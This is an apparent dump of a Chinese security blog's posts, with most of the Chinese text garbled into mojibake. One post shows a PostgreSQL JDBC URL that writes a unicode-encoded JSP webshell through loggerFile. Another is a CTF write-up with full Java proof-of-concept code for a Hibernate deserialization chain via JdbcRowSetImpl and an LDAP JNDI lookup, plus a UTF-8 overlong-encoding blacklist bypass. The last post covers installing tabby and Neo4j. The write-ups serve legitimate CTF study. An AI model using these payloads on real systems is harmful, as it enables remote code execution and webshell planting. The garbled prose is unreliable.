è¿”å›åç»§ç»­å¾€ä¸‹èµ°ï¼Œè·Ÿè¿›makeConnectionæ–¹æ³•ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯è¦å¼€å§‹å»ºç«‹è”ç³» è·Ÿè¿›PgConnectionæ–¹æ³• åˆè¿›è¡Œäº†ä¸€æ¬¡èµ‹å€¼ä¹‹åï¼Œç»§ç»­å¾€ä¸‹èµ° è·Ÿè¿›openConnectionæ–¹æ³• åˆå§‹åŒ–ä¸€ä¸ªConnectionFactoryå¯¹è±¡ä¹‹åï¼Œè°ƒç”¨å…¶openConnectionImplæ–¹æ³•ï¼Œè·Ÿè¿›å» è·Ÿè¿›getSocketFactoryæ–¹æ³•ï¼Œå…ˆä»å‰é¢è§£æjdbcä¸²æ—¶ returnçš„Propertieså¯¹è±¡ä¸­ï¼Œè·å–socketFactoryçš„ç±»åï¼Œä¹Ÿå°±æ˜¯org.springframework.context.support.ClassPathXmlApplicationContext ä¹‹åè°ƒç”¨instantiateå¯¹å…¶å®ä¾‹åŒ–å¤„ç†ï¼Œä¹Ÿå°±æ˜¯æ¼æ´è§¦å‘ç‚¹ è¿™é‡Œæ˜¯ä¸€ä¸ªä»»æ„ç±»å®ä¾‹åŒ–çš„ç‚¹ï¼Œå¯ä»¥è°ƒç”¨åªæœ‰1ä¸ªå…¥å‚ï¼Œå‚æ•°ç±»å‹ä¸ºStringçš„æœ‰å‚æ„é€ è¿›è¡Œå®ä¾‹åŒ– å¼¹å‡ºè®¡ç®—å™¨ loggerLevelloggerFilepoc jdbc:postgresql://127.0.0.1:5432/testdb?ApplicationName=\\u003c\\u0025\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u002e\\u0067\\u0065\\u0074\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0028\\u0029\\u002e\\u0065\\u0078\\u0065\\u0063\\u0028\\u0022\\u006f\\u0070\\u0065\\u006e\\u0020\\u002d\\u0061\\u0020\\u0063\\u0061\\u006c\\u0063\\u0075\\u006c\\u0061\\u0074\\u006f\\u0072\\u0022\\u0029\\u007d\\u003b\\u0025\\u003eloggerLevel=TRACEloggerFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/she11.jspdriver=org.postgresql.Driverurl=jdbc:postgresql://172.16.105.1/test/?loggerLevel=DEBUGloggerFile=../webapps/ROOT/static/555.jsp%! \\uxxx\\uxxx%%\\uxxx% =user=testpwd=123123 è¿™ä¸ªç‚¹ä¸ç®—å¤æ‚çš„ï¼Œæ˜¯logåŠŸèƒ½å†™æ–‡ä»¶ï¼Œåªæ˜¯æä¸€ä¸‹å†™shelléœ€è¦æ³¨æ„çš„ä¸€ä¸ªåœ°æ–¹,æ–‡ä»¶å†…å®¹åœ¨ä¸‹å›¾åœ°æ–¹ä¼šæœ‰ä¸€ä¸ªå¤„ç† è¿™é‡Œæ„é€ æ•°æ®åŒ…æ—¶å¯ä»¥é€šè¿‡unicodeç¼–ç shellå†…å®¹=æ¥è¿›è¡Œshellå†™å…¥ï¼Œé€šè¿‡æœ¬èº«ä»£ç é€»è¾‘ï¼Œè®©=æˆªæ–­æ‰å‰é¢çš„shellå†…å®¹ç»•è¿‡URLDecoderçš„å¤„ç†ã€‚å…¶ä»–çš„æ–¹å¼åº”è¯¥ä¹Ÿå¯ä»¥ï¼Œåªè¦è®©=ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ä½äºshellå†…å®¹åé¢æˆ–è€…shellå†…å®¹ä¸­ä¸å­˜åœ¨ä¼šè®©URLDecoder.decodeæŠ›å¼‚å¸¸çš„å­—ç¬¦å³å¯ã€‚ ä¾‹å¦‚ %! \\uxxx\\uxxx%%\\uxxx% H2h2é…ç½® spring.h2.console.enabled=truespring.h2.console.settings.web-allow-others=true è€Œh2æœ¬èº«çš„consoleç•Œé¢ä¹Ÿæ˜¯å¯ä»¥é€šè¿‡jdbcè¿æ¥ä¸²æ¥è¿›è¡Œjndiåˆ©ç”¨çš„ https://www.cnblogs.com/CoLo/p/17051019.html#h2 å…ˆæä¸€ä¸‹ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚","categories":["javaååºåˆ—åŒ–"]},{"title":"è½¯ä»¶ç³»ç»Ÿå®‰å…¨èµ›2025åä¸œèµ›åŒºåŠå†³èµ›web-justDeserialize","path":"/2025/03/30/è½¯ä»¶ç³»ç»Ÿå®‰å…¨èµ›2025åä¸œèµ›åŒºåŠå†³èµ›web-justDeserialize/","content":"å‰è¨€çœ‹ç€è¿™é¢˜ç›®jaråŒ…æœ‰æ¥è¿‘40Mbçš„æ—¶å€™å°±ç›´æ¥å†³å®šå…ˆå»å­¦ä¸‹tabbyçš„ç®€å•ä½¿ç”¨ï¼Œç”±äºå­¦ä¸šå½±å“å’Œè‡ªå·±é…ç½®è¿‡ç¨‹ä¸­é­é‡äº†è®¸å¤šè«åå…¶å¦™çš„æŠ¥é”™å¯¼è‡´èŠ±äº†ä¸‰å¤©æ‰ç»“æŸ å¼€å§‹åšé¢˜ï¼Œè§£é¢˜è¿‡ç¨‹ä¸­å‘ç°å…¶å®ä¸éœ€è¦tabbyï¼Œå¿ƒæœ‰ç‚¹ç—›ï¼ˆè™½è¯´è¿™å·¥å…·æ—©æ™šéƒ½è¦å­¦ã€‚ã€‚ã€‚ï¼‰ é¢˜è§£å…ˆè‡ªå·±æœ¬åœ°æ ¹æ®jaråŒ…æ­äº†ä¸ªç¯å¢ƒä»¥ä¾¿è¿›è¡Œè°ƒè¯• å¤§æ¦‚è¿‡äº†ä¸€ä¸‹æ¯”è¾ƒé‡è¦çš„æ–‡ä»¶ï¼Œé¦–å…ˆå°±æ˜¯backdoor.classæ–‡ä»¶ï¼Œé‡Œé¢é‡è¦çš„ç‚¹æ˜¯ç»™äº†æˆ‘ä»¬ä¸€ä¸ªreadè·¯ç”± @RequestMapping(/read) public String read(@RequestBody String body) if (body != null) try byte[] data = Base64.getDecoder().decode(body); String temp = new String(data); if (!temp.contains(naming) !temp.contains(com.sun) !temp.contains(jdk.jfr)) ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(data); MyObjectInputStream objectInputStream = new MyObjectInputStream(byteArrayInputStream); Object object = objectInputStream.readObject(); return object.getClass().toString(); else return banned; catch (Exception var7) Exception e = var7; return e.toString(); else return ok; ä¼šæ£€æµ‹è§£ç åçš„åºåˆ—åŒ–å†…å®¹ä¸­æ˜¯å¦å­˜åœ¨namingï¼Œcom.sunï¼Œjdk.jfrå­—æ®µï¼Œæœ‰çš„è¯ç›´æ¥è¿”å›banned å¦‚æœæˆåŠŸè¿›å…¥ifå†…å®¹ï¼Œä¼šè°ƒç”¨è‡ªå·±å†™çš„MyObjectInputStreamæ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œé€šè¿‡æŸ¥çœ‹MyObjectInputStreamç±»å¯ä»¥æ˜ç™½åªè¦æ˜¯åŠ äº†ä¸€ä¸ªé»‘åå•æ£€æµ‹ é»‘åå•å†…å®¹å¦‚ä¸‹ï¼š javax.management.BadAttributeValueExpExceptioncom.sun.org.apache.xpath.internal.objects.XStringjava.rmi.MarshalledObjectjava.rmi.activation.ActivationIDjavax.swing.event.EventListenerListjava.rmi.server.RemoteObjectjavax.swing.AbstractActionjavax.swing.text.DefaultFormatterjava.beans.EventHandlerjava.net.Inet4Addressjava.net.Inet6Addressjava.net.InetAddressjava.net.InetSocketAddressjava.net.Socketjava.net.URLjava.net.URLStreamHandlercom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpljava.rmi.registry.Registryjava.rmi.RemoteObjectInvocationHandlerjava.rmi.server.ObjIDjava.lang.Systemjavax.management.remote.JMXServiceURjavax.management.remote.rmi.RMIConnectorjava.rmi.server.RemoteObjectjava.rmi.server.RemoteRefjavax.swing.UIDefaults$TextAndMnemonicHashMapjava.rmi.server.UnicastRemoteObjectjava.util.Base64java.util.Comparatorjava.util.HashMapjava.util.logging.FileHandlerjava.security.SignedObjectjavax.swing.UIDefaults å¯ä»¥çœ‹åˆ°ä¸»è¦æ˜¯ç¦äº†ä¸€äº›åŸºç¡€é“¾å­ï¼Œç”šè‡³æ˜¯HashMapç±»éƒ½ç»™ä½ ç¦æ‰äº† æœ€å¼€å§‹çœ‹åˆ°é¢˜ç›®ä¾èµ–é‡Œé¢æœ‰jacksonä¾èµ–ï¼Œå¹¶ä¸”ç‰ˆæœ¬æ­£ç¡®å¯ä»¥ç”¨é€šæ€çš„æ—¶å€™æƒ³ç›´æ¥ä¸Šæ‰‹ï¼Œä½†æ˜¯é»‘åå•ç›´æ¥æŠŠå¿…éœ€çš„ä¸¤ä¸ªç±»ç»™ç¦æ‰äº† å¦å¯»æ€è·¯ï¼Œå‘ç°è¿˜æœ‰hibernateä¾èµ–ï¼Œæ›´å¹¸è¿çš„æ˜¯è¯¥é“¾å­é™¤äº†ä¸€ä¸ªå…¥å£ç±»HashMapç»™ç¦æ‰äº†ä¹‹å¤–å‰©ä¸‹çš„éƒ½æ²¡æœ‰ å¾ˆå¥½ï¼Œæ­£å¥½çœ‹è¿™é“é¢˜ä¹‹å‰åˆšå­¦å®ŒRomeååºåˆ—åŒ–ï¼ŒçŸ¥é“ä¸HashMapç±»èµ·åˆ°çš„ä½œç”¨ç±»ä¼¼çš„è¿˜æœ‰ä¸€ä¸ªHashTableç±» è‡ªå·±æµ‹è¯•ä¸€æ‰‹çœ‹çœ‹æ˜¯å¦æœ‰hibernateæ¼æ´ è‡ªå·±å†™çš„Usersç±» package org.sherlock;import java.io.Serializable;public class Users implements Serializable private static final long serialVersionUID = -7576821597219903730L; public int id; public void setId(int id) this.id = id; public int getId() throws Exception Runtime.getRuntime().exec(calc); return id; æµ‹è¯•çš„poc package org.sherlock;import org.hibernate.engine.spi.TypedValue;import org.hibernate.property.access.spi.Getter;import org.hibernate.property.access.spi.GetterMethodImpl;import org.hibernate.tuple.component.AbstractComponentTuplizer;import org.hibernate.tuple.component.PojoComponentTuplizer;import org.hibernate.type.ComponentType;import sun.reflect.ReflectionFactory;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.Base64;import java.util.Hashtable;public class Main public static void main(String[] args) throws Exception Users user = new Users(); user.setId(1); HashtableObject, Object hashtable = new Hashtable(); ComponentType componentType = (ComponentType) createObjWithoutConstructor(ComponentType.class); setField(componentType,propertySpan,2); TypedValue typedValue = new TypedValue(componentType,user); PojoComponentTuplizer pojoComponentTuplizer = (PojoComponentTuplizer) createObjWithoutConstructor(PojoComponentTuplizer.class); Class? c = AbstractComponentTuplizer.class; Field field = c.getDeclaredField(getters); field.setAccessible(true); field.set(pojoComponentTuplizer,new Getter[]new GetterMethodImpl(Object.class,qwq, Users.class.getDeclaredMethod(getId))); setField(componentType,componentTuplizer,pojoComponentTuplizer); hashtable.put(1,1); Field tableField = Hashtable.class.getDeclaredField(table); tableField.setAccessible(true); Object[] table = (Object[]) tableField.get(hashtable); for (Object entry: table) if (entry != null) setField(entry,key,typedValue); byte[] bytes = ser(hashtable); System.out.println(Base64.getEncoder().encodeToString(bytes)); unser(bytes); public static Object createObjWithoutConstructor(Class clazz) throws Exception ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); ConstructorObject constructor = Object.class.getDeclaredConstructor(); Constructor? constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor); constructor1.setAccessible(true); return constructor1.newInstance(); public static void setField(Object object,String fieldName,Object value) throws Exception Class? c = object.getClass(); Field field = c.getDeclaredField(fieldName); field.setAccessible(true); field.set(object,value); public static byte[] ser(Object o) throws Exception ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(o); return byteArrayOutputStream.toByteArray(); public static Object unser(byte[] bytes) throws Exception ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); return objectInputStream.readObject(); æµ‹è¯•å¯ä»¥æ­£å¸¸å¼¹å‡ºè®¡ç®—å™¨ï¼Œå­˜åœ¨hibernateæ¼æ´ okï¼Œæˆ‘ä»¬ç»§ç»­ï¼Œå› ä¸ºä¸Šé¢æµ‹è¯•çš„Usersç±»æ˜¯æˆ‘ä»¬è‡ªå·±å†™å‡ºæ¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ‰¾åˆ°é¢˜ç›®æœ¬èº«å¯ä»¥åˆ©ç”¨çš„getteræ–¹æ³• æå‡ºè‹¦ç»ƒä¸‰å¤©çš„tabbyï¼Œå¼€å§‹æ‰« ç”±äºè¿™ä¸ªè¿‡ç¨‹å®åœ¨æ˜¯æœ‰ç‚¹ä¹…ï¼ˆè½»è–„æœ¬å¼€å°½é©¬åŠ›æ‰«äº†å·®ä¸å¤š45åˆ†é’Ÿã€‚ã€‚ã€‚ï¼‰ï¼Œåœ¨è¿™è¿‡ç¨‹ä¸­boringçš„æˆ‘åˆå»ç¿»äº†ç¿»è‡ªå·±å­¦hibernateæ¼æ´çš„ç¬”è®°ï¼Œå‘ç°hibernate2è¿™æ¡é“¾å­åˆ©ç”¨çš„æ˜¯jndiæ³¨å…¥ï¼Œå¹¶ä¸”ç”¨åˆ°çš„å…³é”®ç±»com.sun.rowset.JdbcRowSetImplä¸åœ¨é»‘åå•ä¸Šé¢ èŠœæ¹–ï¼Œä½†æœ‰ç‚¹å¯æƒœçš„æ˜¯è¿˜æ˜¯è¿‡ä¸äº†ifåˆ¤æ–­ çœ‹çœ‹tabbyæ‰«å‡ºæ¥çš„æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ ä¸«çš„ï¼Œç”¨åˆ°çš„LdapAttributeç±»ä¹Ÿæ˜¯åœ¨com.sunåŒ…ä¸‹é¢çš„ï¼Œä¹Ÿè¿‡ä¸äº†ifåˆ¤æ–­ å¾ˆå¥½ï¼Œè¿™è¯´æ˜å…¶å®æ²¡åŒºåˆ«äº†ï¼Œéƒ½è¦æƒ³åŠæ³•ç»•è¿‡ifåˆ¤æ–­ï¼Œè¿™ä¹Ÿå°±æ˜¯è¯´èƒ½ç»•è¿‡é‚£æˆ‘ç›´æ¥ç”¨hibernate2çš„é“¾å°±å¥½äº†ï¼Œä¸éœ€è¦å†èŠ±è„‘å­å»æƒ³tabbyæ‰«å‡ºæ¥çš„è¿™ä¸ªè¦æ€ä¹ˆåˆ©ç”¨ é‚£è¦æ€ä¹ˆç»•å‘¢ï¼Œæˆ‘å°±å»å·¥å…·java-chainsé‡Œé¢é€›äº†é€›ï¼ˆå¼ºæ¨java-chainså·¥å…·ï¼Œå¥½ç”¨ï¼ï¼ï¼ï¼‰ï¼Œå‘ç°é‡Œé¢æœ‰æä¾›å¯¹ç”Ÿæˆçš„payloadè¿›è¡Œä¸€ä¸ªæ··æ·†çš„åŠŸèƒ½ è„æ•°æ®ï¼Œä¸»è¦è¿˜æ˜¯é’ˆå¯¹wafçš„æ€§èƒ½è¿›è¡Œçš„ä¸€ä¸ªç»•è¿‡ï¼Œåœ¨æˆ‘ä»¬è¿™é‡Œæ²¡æœ‰ç”¨ é‚£Utf8OverlongEncodingæ˜¯ä»€ä¹ˆä¸œä¸œï¼Œæœ‰ä»€ä¹ˆç”¨ï¼šhttps://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html çœ‹å®Œpç¥æ–‡ç« æç„¶å¤§æ‚Ÿï¼Œå¯ä»¥åˆ©ç”¨Utf8OverlongEncodingæ–¹æ³•è¿›è¡Œç»•è¿‡ è´´ä¸Špocï¼ˆè¯¥pocåœ¨java8é‡Œé¢è¿è¡Œï¼Œå› ä¸ºsun.reflectåœ¨java11ä¸­æ²¡æœ‰ï¼‰ package org.sherlock;import com.sun.rowset.JdbcRowSetImpl;import org.hibernate.engine.spi.TypedValue;import org.hibernate.property.access.spi.Getter;import org.hibernate.property.access.spi.GetterMethodImpl;import org.hibernate.tuple.component.AbstractComponentTuplizer;import org.hibernate.tuple.component.PojoComponentTuplizer;import org.hibernate.type.ComponentType;import sun.reflect.ReflectionFactory;import javax.sql.rowset.BaseRowSet;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.Base64;import java.util.Hashtable;public class Test public static void main(String[] args) throws Exception HashtableObject,Object hashtable = new Hashtable(); ComponentType componentType = (ComponentType) createObjWithoutConstructor(ComponentType.class); setField(componentType,propertySpan,2); PojoComponentTuplizer pojoComponentTuplizer = (PojoComponentTuplizer) createObjWithoutConstructor(PojoComponentTuplizer.class); JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl(); Class c0 = BaseRowSet.class; Field dataSourceField = c0.getDeclaredField(dataSource); dataSourceField.setAccessible(true); dataSourceField.set(jdbcRowSet,ldap://127.0.0.1:50389/98b84c); Class? c = AbstractComponentTuplizer.class; Field field = c.getDeclaredField(getters); field.setAccessible(true); field.set(pojoComponentTuplizer,new Getter[]new GetterMethodImpl(Object.class,qwq, JdbcRowSetImpl.class.getDeclaredMethod(getDatabaseMetaData))); setField(componentType,componentTuplizer,pojoComponentTuplizer); hashtable.put(1,1); TypedValue typedValue = new TypedValue(componentType,jdbcRowSet); Field tableField = Hashtable.class.getDeclaredField(table); tableField.setAccessible(true); Object[] table = (Object[]) tableField.get(hashtable); for (Object entry: table) if (entry != null) setField(entry,key,typedValue); byte[] bytes = ser(hashtable); System.out.println(Base64.getEncoder().encodeToString(bytes)); unser(bytes); public static Object createObjWithoutConstructor(Class clazz) throws Exception ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); ConstructorObject constructor = Object.class.getDeclaredConstructor(); Constructor? constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor); constructor1.setAccessible(true); return constructor1.newInstance(); public static void setField(Object object,String fieldName,Object value) throws Exception Class? c = object.getClass(); Field field = c.getDeclaredField(fieldName); field.setAccessible(true); field.set(object,value); public static byte[] ser(Object o) throws Exception ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(o); return byteArrayOutputStream.toByteArray(); public static Object unser(byte[] bytes) throws Exception ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); return objectInputStream.readObject(); å°†ç”Ÿæˆçš„base64ç¼–ç å­—ç¬¦ä¸²æ‹¿åˆ°java-chainså·¥å…·ä¸­è¿›è¡Œä¸€ä¸ªUtf8OverlongEncodingæ··æ·†åï¼Œå†æ‹¿åˆ°bpä¸­postä¼ è¿‡å» æ­£å¸¸ååºåˆ—åŒ–æ”»å‡»æŠ¥é”™ï¼Œä½†æ˜¯æ²¡å¼¹å‡ºè®¡ç®—å™¨ why,why,why è‡ªå·±è°ƒè¯•äº†ä¸€ä¸‹ï¼Œå‘ç°å¿˜è®°äº†é¢˜ç›®ç‰ˆæœ¬æ˜¯java11ï¼Œå·²ç»ä¸å…è®¸è¿œç¨‹ç±»åŠ è½½äº† æ— å¦¨ï¼Œä¹‹å‰å­¦è¿‡jndié«˜ç‰ˆæœ¬ç»•è¿‡ï¼Œç”¨ä¸Šï¼Œç»“æœæŠ¥é”™å¦‚ä¸‹ï¼š ä¸å®‰å…¨å­—æ®µforceStringå­—æ®µå·²ç»æ²¡æ‰äº†(é«˜ç‰ˆæœ¬ç»•è¿‡æ²¡å­¦çš„åˆ°å®¶ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚) okï¼Œè„‘å­æ²¡æ€è·¯äº†ï¼Œæ±‚åŠ©äº†ä¸€ä¸‹å­¦é•¿ï¼Œå‘Šè¯‰æˆ‘java-chainsé‡Œé¢è¿˜æœ‰å¯ä»¥ç»•è¿‡çš„é“¾å­ ç”±äºé¢˜ç›®ä¾èµ–é‡Œæœ‰jacksonï¼Œåˆ©ç”¨ä¸Š å°†ç”Ÿæˆçš„ldapç½‘å€æ›¿ä»£ä¸Šé¢çš„pocä¸­çš„ldapç½‘å€ï¼Œå°†ç”Ÿæˆçš„base64å­—ç¬¦ä¸²è¿›è¡Œæ··æ·†ï¼Œå‘é€ï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ å®Œç»“ï¼Œæ’’èŠ± å¼•ç”¨è½¯ä»¶ç³»ç»Ÿå®‰å…¨èµ›2025åä¸œèµ›åŒºåŠå†³èµ›wp-web","categories":["Write-Up"]},{"title":"å·¥å…·tabbyçš„å­¦ä¹ ä¹‹è·¯","path":"/2025/03/24/å·¥å…·tabbyçš„å­¦ä¹ ä¹‹è·¯/","content":"å‰è¨€åŸæœ¬æ²¡æƒ³ç€è¿™ä¹ˆæ—©å°±å¼€å­¦tabbyï¼Œä½†ç”±äºå­¦é•¿å‘äº†ä¸ªjavaé¢˜ç›®æ¥é”»ç‚¼é”»ç‚¼æˆ‘çš„èƒ½åŠ›ï¼Œä¸€å¼€å‹ç¼©åŒ…æˆ‘äº†ä¸ªè±†40MBï¼Œè‡ªå·±å®¡è®¡ä¸çŸ¥é“è¦å®¡åˆ°çŒ´å¹´é©¬æœˆï¼Œåšctfè®²ç©¶ä¸€ä¸ªæ•ˆç‡ï¼Œæ‰€ä»¥æ¯…ç„¶å†³ç„¶æ¥å¼€tabby ï¼ˆæ²¡æƒ³åˆ°å¼€äº†ä¸‰å¤©æ‰ç»“æŸã€‚ã€‚ã€‚ï¼‰ ç¯å¢ƒæ­å»ºtabbyé…ç½®ï¼ˆæˆªè‡³åˆ°2025.3.24ï¼Œtabbyæœ€æ–°ç‰ˆæœ¬ä¸ºv2.0.0ï¼‰ tabbyéœ€è¦çš„javaç‰ˆæœ¬ä¸º17ï¼Œæ‰€ä»¥è¯·å…ˆæŠŠè‡ªå·±ç”µè„‘é‡Œé¢ç³»ç»Ÿç¯å¢ƒå˜é‡ä¸­çš„javaç‰ˆæœ¬æ”¹ä¸º17 åœ¨é¡¹ç›®åœ°å€ï¼šhttps://github.com/wh1t3p1g/tabbyçš„releaseä¸‹è½½ä¸‹æœ€æ–°çš„tabbyï¼Œå¦‚æœå‡ºé—®é¢˜äº†å¯ä»¥pullä¸€ä»½æºç è‡ªå·±æœ¬åœ°ç”¨gradleç¼–è¯‘ä¸€ä¸‹ï¼ˆæ³¨æ„gradleä½¿ç”¨çš„jdkç¯å¢ƒä¹Ÿå¾—æ˜¯è‡³å°‘17ï¼‰ ä¸€ä¸ªç¼–è¯‘æ‰“åŒ…å¥½çš„tabbyç›®å½•ç»“æ„åº”è¯¥å¦‚ä¸‹ï¼š $ tree.â”œâ”€â”€ cases # ç”¨äºæ”¾ç½®å¾…åˆ†æçš„é¡¹ç›®ï¼Œå¯ä»¥æ˜¯å•ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯ç›®å½•â”‚ â””â”€â”€ commons-collections-3.2.1.jarâ”œâ”€â”€ config # ç”¨äºæ”¾ç½®é…ç½®æ–‡ä»¶â”‚ â”œâ”€â”€ db.properties # é…ç½®æ•°æ®åº“ç›¸å…³å†…å®¹â”‚ â””â”€â”€ settings.properties # é…ç½®å¾…åˆ†æé¡¹ç›®ã€æ±¡ç‚¹åˆ†æç­‰å†…å®¹â”œâ”€â”€ output # ç”¨äºæ”¾ç½®ç”Ÿæˆåçš„csvæ–‡ä»¶â”‚ â””â”€â”€ devâ”œâ”€â”€ rules # è§„åˆ™æ–‡ä»¶å¤¹â”‚ â”œâ”€â”€ basicClasses.json â”‚ â”œâ”€â”€ commonJars.json # ç”¨äºæ’é™¤æ— éœ€åˆ†æçš„ä¸‰æ–¹jarâ”‚ â”œâ”€â”€ cyphers.yml # ç”¨äº tabby-vul-finder è‡ªåŠ¨åŒ–æ£€ç´¢â”‚ â”œâ”€â”€ sinks.json # ç”¨äºé…ç½® sink å‡½æ•°â”‚ â”œâ”€â”€ system.json # ç”¨äºé…ç½®ä¸“å®¶è§„åˆ™â”‚ â””â”€â”€ tags.json # ç”¨äºé…ç½®sourceç‚¹è¯†åˆ«â”œâ”€â”€ temp # v2.0 ç‰ˆæœ¬å¼€å§‹å°†ä¸´æ—¶æ–‡ä»¶éƒ½ç”Ÿæˆåˆ°åŒçº§tempç›®å½•ä¸‹â”œâ”€â”€ run.sh # è¿è¡Œå„ç±»ä»»åŠ¡çš„bashè„šæœ¬â”œâ”€â”€ tabby-vul-finder.jar # ç”¨äºå¯¼å…¥å’Œè‡ªåŠ¨åŒ–æŸ¥è¯¢çš„ jarâ””â”€â”€ tabby.jar # æ ¸å¿ƒjarï¼Œç”¨äºç”Ÿæˆå›¾æ•°æ® æˆ‘ä»¬ä¸‹è½½ä¸‹æ¥çš„tabbyçš„configç›®å½•ä¸‹é¢åªæœ‰ä¸€ä¸ªsettins.propertiesæ–‡ä»¶ï¼Œè¿™æ˜¯æ­£å¸¸çš„ï¼Œä¸ç”¨æ‹…å¿ƒ è¿˜è¦æ›´å…·ä½“çš„ä¿¡æ¯å¯å‚è€ƒå®˜æ–¹æ–‡æ¡£ ç¬¬ä¸€æ¬¡è¿è¡Œçš„è¯ä¼šåˆ›å»ºä¸€ä¸ªoutputç›®å½•ï¼Œå¹¶ä¸”è¿˜ä¼šæŠ¥é”™ï¼Œè¿™å¾ˆæ­£å¸¸ï¼Œçœ‹æŠ¥é”™æ˜¯è¯´targetæ²¡æœ‰æ‰¾åˆ°ç›®æ ‡ï¼Œè¿™æ˜¯å¯¹çš„å˜›ï¼Œæ¯•ç«Ÿæˆ‘ä»¬éƒ½è¿˜æ²¡æŒ‡å®šè¦åˆ†æä»€ä¹ˆç›®æ ‡ Neo4jé…ç½®æ³¨æ„ï¼šç”±äº tabby-path-finder éœ€è¦ä½¿ç”¨ Neo4j 5.x ç‰ˆæœ¬ï¼Œæ¨èé»˜è®¤é‡‡ç”¨ 5.x ç‰ˆæœ¬ é¦–å…ˆä¸æ˜¯ç‰¹åˆ«å»ºè®®ä¸‹è½½neo4j desktopï¼Œ å¦åˆ™ä½ å°†é¢å¯¹çš„æ˜¯ï¼š åˆå§‹åŒ–å‘è¢«å¢™çš„neo4jç«™ç‚¹å‘é€ç­¾åéªŒè¯ï¼Œå¦‚æœæ²¡èµ°ä»£ç†å¯èƒ½è¿›ç¨‹æ‰“å¼€äº†ä½†æ˜¯æ²¡æœ‰ç•Œé¢å¼¹å‡ºæ¥ å³ä½¿èµ°äº†ä»£ç†ä¹Ÿå¯èƒ½æŠ½é£403 æ˜æ˜ç¯å¢ƒå˜é‡ç¡®å®æ˜¯17ä½†æ˜¯å¯åŠ¨æ•°æ®åº“ä»ç„¶æç¤ºä¸»ç±»æ‰¾ä¸åˆ° æ•°æ®åº“å¯åŠ¨å¼‚å¸¸ç¼“æ…¢ï¼Œæ˜æ˜æˆåŠŸå¯åŠ¨äº†ä½†æ˜¯è¿˜æ˜¯æŠ¥é”™å¾—å†ç‚¹ä¸€æ¬¡ å½“ç„¶ï¼Œä»¥ä¸Šé™¤äº†ç¬¬ä¸€äºŒç‚¹ï¼Œå…¶ä»–çš„å¯èƒ½å­˜åœ¨ä¸ªäººå› ç´ ï¼Œæ€»ä¹‹å„æœ‰åƒç§‹ è¿™é‡Œä¾§é‡ä½¿ç”¨ç¤¾åŒºç‰ˆï¼š åœ¨å®˜ç½‘ï¼šhttps://neo4j.com/deployment-center/#community æˆ– å¾®äº‘çš„ç«™ç‚¹ï¼šhttps://we-yun.com/doc/neo4j/ åœ¨å¾®äº‘é‡Œé¢æˆ‘ä¸‹çš„æ˜¯5.26.4 ä¸‹è½½å®Œåå°±éšä¾¿æ‰”åœ¨ä¸€ä¸ªåœ°æ–¹å°±è¡Œäº†ï¼Œç¯å¢ƒå˜é‡æƒ³é…çš„è¯ä¹Ÿå¯ä»¥ï¼Œä¸æƒ³é…çš„è¯å°±æ¯æ¬¡åˆ°binç›®å½•ä¸‹é¢æ‰§è¡Œç›¸å…³å‘½ä»¤å°±å¯ä»¥äº† ï¼ˆè¯ä¹¦ä¼¼ä¹ä¹Ÿå¯ä»¥ä¸è£…ï¼Œæ²¡å½±å“ï¼‰ ç›¸å…³çš„æŒ‡ä»¤ console: ç›´æ¥å¯åŠ¨ neo4j æœåŠ¡å™¨install-service | uninstall-service | update-service ï¼š å®‰è£…å¸è½½æ›´æ–° neo4j æœåŠ¡startstoprestartstatus: å¯åŠ¨åœæ­¢é‡å¯çŠ¶æ€-V è¾“å‡ºæ›´å¤šä¿¡æ¯ è¿›å…¥åˆ°binç›®å½•ï¼Œæ‰§è¡Œ neo4j console åœ¨æµè§ˆå™¨ä¸­è®¿é—®http://localhost:7474ä½¿ç”¨ç”¨æˆ·åneo4jå’Œé»˜è®¤å¯†ç neo4jè¿›è¡Œè¿æ¥ï¼Œç„¶åä¼šæç¤ºæ›´æ”¹å¯†ç ï¼ˆè¦è®°ä½æ›´æ”¹å®Œåçš„å¯†ç ï¼‰ æ¥ç€æˆ‘ä»¬å›åˆ°tabbyçš„å®˜æ–¹æ–‡æ¡£å»çœ‹çœ‹å…³äºNeo4jçš„ç›¸å…³é…ç½® æ–‡æ¡£ä¸­è®©æˆ‘ä»¬ä¸‹è½½ä¸¤ä¸ªæ’ä»¶ï¼Œå¹¶ä¸”å¯¹åº”çš„ç‰ˆæœ¬ä¸èƒ½å¼„é”™ æ’ä»¶ä¸‹è½½å®Œåä¸¢åˆ°pluginsç›®å½•ä¸‹é¢å°±å¥½äº† 